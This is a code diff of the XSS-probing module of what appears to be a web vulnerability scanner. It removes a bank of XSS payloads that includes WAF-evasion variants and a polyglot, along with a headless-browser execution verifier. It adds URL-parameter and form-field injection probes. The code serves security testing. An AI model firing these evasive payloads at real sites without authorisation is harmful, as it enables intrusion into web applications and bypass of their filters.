@@ -1,220 +1,161 @@
-import { buildPayloadTarget, PayloadFormat } from "../payloads";
-import { ScannerFinding } from "./sqli";
+import { buildPayloadTarget, PayloadFormat, XSS_PAYLOADS } from "../payloads";
+import { AuthSession, CONFIDENCE, EMPTY_SESSION, FormTarget, PendingFinding } from "../types";
+import { authedFetch } from "../session";
+import { browserVerifyXssExecution, confirmXSSHit, shuffleArray } from "../verify";
 
-// ─────────────────────────────────────────────────────────────────────────────
-// XSS PAYLOAD BANK — WAF-evasion variants included
-// Payloads are shuffled per-scan (see shufflePayloads) to prevent WAF
-// fingerprinting based on a fixed request sequence.
-// ─────────────────────────────────────────────────────────────────────────────
+export async function probeReflectedXSS(
+  paramUrl: string,
+  session: AuthSession = EMPTY_SESSION,
+  log?: (m: string) => void,
+  scanId?: string
+): Promise<PendingFinding | null> {
+  try {
+    const u = new URL(paramUrl);
+    const params = [...u.searchParams.keys()];
+    if (params.length === 0) return null;
 
-const XSS_PAYLOADS_BANK: string[] = [
-  // ── Minimal tag markers (lowest WAF signature risk) ──────────────────────
-  "<vulnscanXSStag>",
-  "<VULNSCANXSSTAG>",                                        // mixed-case bypass
+    const payloads = shuffleArray(XSS_PAYLOADS);
 
-  // ── Classic script injection ──────────────────────────────────────────────
-  "<script>/*vulnscan*/</script>",
-  "<Script>/*vulnscan*/</Script>",                           // mixed-case evasion
-  "<scr\x00ipt>alert(1)</scr\x00ipt>",                      // null-byte splice
+    for (const param of params) {
+      for (const payload of payloads) {
+        try {
+          const testUrl = new URL(u.toString());
+          testUrl.searchParams.set(param, payload);
+          const resp = await authedFetch(testUrl.toString(), {}, 8000, false, session);
+          if (!resp) continue;
+          const body = await resp.text();
+          const htmlEncoded =
+            body.includes(payload.replace(/</g, "&lt;").replace(/>/g, "&gt;")) ||
+            body.includes(payload.replace(/"/g, "&quot;")) ||
+            body.includes(payload.replace(/'/g, "&#x27;")) ||
+            body.includes(payload.replace(/'/g, "&#39;")) ||
+            body.includes(payload.replace(/</g, "&amp;lt;").replace(/>/g, "&amp;gt;"));
+          const reflected = body.includes(payload) && !htmlEncoded;
+          if (!reflected) continue;
 
-  // ── Attribute break-out / event handlers ─────────────────────────────────
-  `"><img src=x onerror=alert('vulnscan')>`,
-  `"><IMG SRC=x ONERROR=alert('vulnscan')>`,                 // upper-case attr
-  `"><img src=x onerror=alert\`vulnscan\`>`,                 // template-literal call
-  `" onmouseover="alert('vulnscan')"`,
-  `" onfocus="alert('vulnscan')" autofocus="`,
+          const confirmed = await confirmXSSHit(paramUrl, param, payload, session);
+          if (!confirmed) continue;
 
-  // ── JS context break-out ─────────────────────────────────────────────────
-  `';alert('vulnscan');//`,
-  `\`;alert('vulnscan');//`,                                 // back-tick quote
+          let execConfirmed = false;
+          if (scanId && log) {
+            execConfirmed = await browserVerifyXssExecution(testUrl.toString(), log, scanId);
+          }
 
-  // ── SVG / namespace tricks ────────────────────────────────────────────────
-  `<svg onload=alert(1)>`,
-  `<svg/onload=alert(1)>`,                                   // no-space evasion
-  `<svg><script>alert(1)</script></svg>`,
-  `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">`,
+          const confidence = execConfirmed ? CONFIDENCE.EXEC_VERIFIED : CONFIDENCE.DUAL_VERIFIED;
+          const evidence = execConfirmed
+            ? `Reflected XSS CONFIRMED (browser-executed + dual-payload) via URL parameter "${param}". Payload "${payload}" reflected unencoded, confirmed with a second payload, AND executed in a real browser context (window.alert fired).`
+            : `Reflected XSS confirmed (dual-payload verified) via URL parameter "${param}". Payload reflected unencoded and confirmed with a second payload.`;
+          const steps = [
+            `Payload "${payload}" reflected unencoded in param "${param}" (randomized payload order)`,
+            "Second distinct XSS payload also reflected unencoded (confirmation)",
+            ...(execConfirmed ? ["Browser (Playwright/headless) confirmed payload execution — alert() fired"] : []),
+          ];
 
-  // ── HTML entity / Unicode encoding ───────────────────────────────────────
-  `<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>`,  // HTML hex entities
-  `<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>`,  // Unicode escapes
-  `%3Cscript%3Ealert(1)%3C/script%3E`,                      // URL-encoded
-
-  // ── Protocol-based ───────────────────────────────────────────────────────
-  `javascript:alert('vulnscan')`,
-  `JaVaScRiPt:alert('vulnscan')`,                           // mixed-case protocol
-
-  // ── onerror handler with innocuous src ───────────────────────────────────
-  `<img src="" onerror="document.title='VULNSCAN'">`,
-
-  // ── Polyglot (fires in HTML, attribute, JS, URL contexts) ────────────────
-  `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`,
-
-  // ── CSS injection with expression ────────────────────────────────────────
-  `<style>*{x:expression(alert(1))}</style>`,
-
-  // ── details/summary HTML5 event ───────────────────────────────────────────
-  `<details open ontoggle=alert(1)>`,
-];
-
-// ─────────────────────────────────────────────────────────────────────────────
-// SHUFFLE UTIL — Fisher-Yates, returns a new array (original unchanged)
-// ─────────────────────────────────────────────────────────────────────────────
-
-/**
- * Returns a shallow copy of `arr` with elements in a random order.
- * Called once per probe invocation so each scan uses a unique payload sequence,
- * preventing WAF signature learning from a fixed request pattern.
- */
-function shufflePayloads<T>(arr: T[]): T[] {
-  const copy = [...arr];
-  for (let i = copy.length - 1; i > 0; i--) {
-    const j = Math.floor(Math.random() * (i + 1));
-    [copy[i], copy[j]] = [copy[j], copy[i]];
-  }
-  return copy;
-}
-
-// ─────────────────────────────────────────────────────────────────────────────
-// BROWSER EXECUTION VERIFIER
-// ─────────────────────────────────────────────────────────────────────────────
-
-/**
- * Opens a candidate XSS URL in the configured headless browser and checks
- * whether the injected payload *executes* (not just appears in HTML text).
- *
- * Strategy:
- *  1. Patches `window.alert`, `window.confirm`, `window.prompt` to set a
- *     `window.__XSS_FIRED__` flag instead of showing a dialog.
- *  2. Hooks `window.onerror` to catch thrown exceptions from injected scripts.
- *  3. Navigates to `testUrl` — if any patched handler fires, execution is
- *     confirmed.
- *
- * Falls back gracefully (returns false) when:
- *  - No browser service is configured and we are on Vercel.
- *  - Playwright is not available (acquireBrowser returns null).
- *  - Navigation times out or throws.
- *
- * @param testUrl  The full URL with the XSS payload already in the query string.
- * @param log      Logging callback.
- * @param scanId   Used to key the browser pool slot.
- * @returns true if the payload fired in the browser; false otherwise.
- */
-export async function browserVerifyXssExecution(
-  testUrl: string,
-  log: (msg: string) => void,
-  scanId: string,
-): Promise<boolean> {
-  // ── Path A: External browser service ──────────────────────────────────────
-  const serviceUrl = process.env.BROWSER_SERVICE_URL;
-  if (serviceUrl) {
-    try {
-      const resp = await fetch(`${serviceUrl.replace(/\/$/, "")}/xss-verify`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ url: testUrl }),
-        signal: AbortSignal.timeout(20000),
-      });
-      if (resp.ok) {
-        const data = await resp.json() as { fired?: boolean };
-        if (data.fired) {
-          log(`🧪  Browser XSS execution confirmed via browser service: ${testUrl}`);
-          return true;
-        }
+          return {
+            type: "reflected-xss",
+            severity: "HIGH",
+            url: testUrl.toString(),
+            parameter: param,
+            evidence,
+            cvssScore: 7.4,
+            cveId: "CWE-79",
+            confidence,
+            validationSteps: steps,
+            isVerified: true,
+          };
+        } catch { /* next payload */ }
       }
-    } catch {
-      // service unavailable — fall through to local Playwright
     }
-  }
-
-  // ── Path B: Vercel — no local browser available ───────────────────────────
-  if (process.env.VERCEL || process.env.NEXT_PUBLIC_VERCEL) {
-    return false;
-  }
-
-  // ── Path C: Local Playwright pool ─────────────────────────────────────────
-  let acquireBrowserFn: ((id: string) => Promise<import("playwright").Browser | null>) | undefined;
-  let releaseBrowserFn: ((id: string) => Promise<void>) | undefined;
-  try {
-    const pool = await import("../../browser-pool");
-    acquireBrowserFn = pool.acquireBrowser;
-    releaseBrowserFn = pool.releaseBrowser;
-  } catch {
-    return false;
-  }
-
-  const slotId = `xss-verify-${scanId}-${Date.now()}`;
-  const browser = await acquireBrowserFn(slotId);
-  if (!browser) return false;
-
-  try {
-    const context = await browser.newContext({
-      javaScriptEnabled: true,
-      ignoreHTTPSErrors: true,
-    });
-    const page = await context.newPage();
-
-    // Instrument the page BEFORE navigation so the script runs early
-    await page.addInitScript(() => {
-      (window as any).__XSS_FIRED__ = false;
-      // Patch dialog functions
-      const mark = () => { (window as any).__XSS_FIRED__ = true; };
-      (window as any).alert   = mark;
-      (window as any).confirm = mark;
-      (window as any).prompt  = mark;
-      // Catch script errors from onerror handlers
-      window.addEventListener("error", () => mark());
-    });
-
-    try {
-      await page.goto(testUrl, { waitUntil: "domcontentloaded", timeout: 15000 });
-    } catch {
-      // timeout is acceptable — check the flag anyway
-    }
-
-    // Short wait for async scripts / event handlers to fire
-    await page.waitForTimeout(1500).catch(() => {});
-
-    const fired: boolean = await page.evaluate(
-      () => !!(window as any).__XSS_FIRED__
-    ).catch(() => false);
-
-    await context.close();
-
-    if (fired) {
-      log(`🧪  Browser XSS execution confirmed via Playwright: ${testUrl}`);
-    }
-    return fired;
-  } catch {
-    return false;
-  } finally {
-    await releaseBrowserFn!(slotId);
-  }
+  } catch { /* skip */ }
+  return null;
 }
 
-// ─────────────────────────────────────────────────────────────────────────────
-// REFLECTED XSS — MULTI-FORMAT PROBE
-// ─────────────────────────────────────────────────────────────────────────────
+export async function probeFormXSS(
+  form: FormTarget,
+  session: AuthSession = EMPTY_SESSION,
+  log?: (m: string) => void,
+  scanId?: string
+): Promise<PendingFinding | null> {
+  const payloads = shuffleArray(XSS_PAYLOADS);
+  for (const field of form.fields) {
+    for (const payload of payloads) {
+      try {
+        const formData = new URLSearchParams();
+        for (const f of form.fields) formData.set(f, f === field ? payload : "test");
 
-/**
- * Probes a parameter for reflected XSS across URL, form, JSON, and GraphQL
- * delivery formats.
- *
- * Enhancements:
- *  - Payload list is **shuffled** before each invocation (WAF-evasion sequencing).
- *  - On first reflection hit, `browserVerifyXssExecution` is called to confirm
- *    actual script execution in a real browser context, upgrading confidence.
- */
+        let resp: Response | null = null;
+        if (form.method === "POST") {
+          resp = await authedFetch(form.actionUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: formData.toString(),
+            redirect: "follow",
+          }, 8000, false, session);
+        } else {
+          const getUrl = new URL(form.actionUrl);
+          for (const [k, v] of formData) getUrl.searchParams.set(k, v);
+          resp = await authedFetch(getUrl.toString(), {}, 8000, false, session);
+        }
+
+        if (!resp) continue;
+        const body = await resp.text();
+        const htmlEncodedForm =
+          body.includes(payload.replace(/</g, "&lt;").replace(/>/g, "&gt;")) ||
+          body.includes(payload.replace(/"/g, "&quot;")) ||
+          body.includes(payload.replace(/'/g, "&#x27;")) ||
+          body.includes(payload.replace(/'/g, "&#39;")) ||
+          body.includes(payload.replace(/</g, "&amp;lt;").replace(/>/g, "&amp;gt;"));
+        const reflected = body.includes(payload) && !htmlEncodedForm;
+        if (!reflected) continue;
+
+        const confirmed = await confirmXSSHit(form.actionUrl, field, payload, session);
+        if (!confirmed) continue;
+
+        let execConfirmed = false;
+        if (scanId && log && form.method === "GET") {
+          const getUrl = new URL(form.actionUrl);
+          getUrl.searchParams.set(field, payload);
+          execConfirmed = await browserVerifyXssExecution(getUrl.toString(), log, scanId);
+        }
+
+        const confidence = execConfirmed ? CONFIDENCE.EXEC_VERIFIED : CONFIDENCE.DUAL_VERIFIED;
+        const evidence = execConfirmed
+          ? `Reflected XSS CONFIRMED (browser-executed + dual-payload) via form field "${field}". Payload "${payload}" reflected unencoded, confirmed with a second payload, AND executed in a real browser context.`
+          : `Reflected XSS confirmed (dual-payload verified) via form field "${field}". Payload reflected unencoded and confirmed with a second payload.`;
+        const steps = [
+          `Payload "${payload}" reflected unencoded in form field "${field}" (randomized payload order)`,
+          "Second payload confirmed with independent reflection check",
+          ...(execConfirmed ? ["Browser (Playwright/headless) confirmed payload execution — alert() fired"] : []),
+        ];
+
+        return {
+          type: "reflected-xss-form",
+          severity: "HIGH",
+          url: form.actionUrl,
+          parameter: field,
+          evidence,
+          cvssScore: 7.4,
+          cveId: "CWE-79",
+          confidence,
+          validationSteps: steps,
+          isVerified: true,
+        };
+      } catch { /* next */ }
+    }
+  }
+  return null;
+}
+
 export async function probeReflectedXSSMultiFormat(
   targetUrl: string,
   paramName: string,
   format: PayloadFormat = "URL_PARAM",
   fields: string[] = [paramName],
-  authedFetch: (url: string, init?: RequestInit) => Promise<Response | null>,
+  authedFetchFn: (url: string, init?: RequestInit) => Promise<Response | null>,
   log?: (msg: string) => void,
-  scanId?: string,
-): Promise<ScannerFinding | null> {
-  // Randomize payload order each invocation
-  const payloads = shufflePayloads(XSS_PAYLOADS_BANK);
+  scanId?: string
+): Promise<PendingFinding | null> {
+  const payloads = shuffleArray(XSS_PAYLOADS);
 
   for (const payload of payloads) {
     try {
@@ -224,13 +165,12 @@ export async function probeReflectedXSSMultiFormat(
         paramName,
         payload,
         format,
-        fields,
+        fields
       );
-      const resp = await authedFetch(fetchUrl, options);
+      const resp = await authedFetchFn(fetchUrl, options);
       if (!resp) continue;
       const text = await resp.text();
 
-      // ── Reflection check (all common HTML encoding variants) ──────────────
       const htmlEncodedForms = [
         payload.replace(/</g, "&lt;").replace(/>/g, "&gt;"),
         payload.replace(/"/g, "&quot;"),
@@ -238,14 +178,13 @@ export async function probeReflectedXSSMultiFormat(
         payload.replace(/'/g, "&#39;"),
         payload.replace(/</g, "&amp;lt;").replace(/>/g, "&amp;gt;"),
       ];
-      const isEncoded = htmlEncodedForms.some(enc => text.includes(enc));
+      const isEncoded = htmlEncodedForms.some((enc) => text.includes(enc));
       const isRawReflected = text.includes(payload) && !isEncoded;
 
       if (!isRawReflected) continue;
 
-      // ── Browser execution verification ────────────────────────────────────
       let execConfirmed = false;
-      if (scanId && log && (format === "URL_PARAM")) {
+      if (scanId && log && format === "URL_PARAM") {
         execConfirmed = await browserVerifyXssExecution(fetchUrl, log, scanId);
       }
 
@@ -276,17 +215,10 @@ export async function probeReflectedXSSMultiFormat(
   return null;
 }
 
-// ─────────────────────────────────────────────────────────────────────────────
-// DOM XSS SINK ANALYZER
-// ─────────────────────────────────────────────────────────────────────────────
-
-/**
- * Analyzes DOM XSS sink execution logs captured by Playwright during JS hydration.
- */
 export function analyzeDomXssEvents(
   url: string,
-  events?: { sink: string; payloadSnippet: string }[],
-): ScannerFinding | null {
+  events?: { sink: string; payloadSnippet: string }[]
+): PendingFinding | null {
   if (!events || events.length === 0) return null;
   const evt = events[0];
 
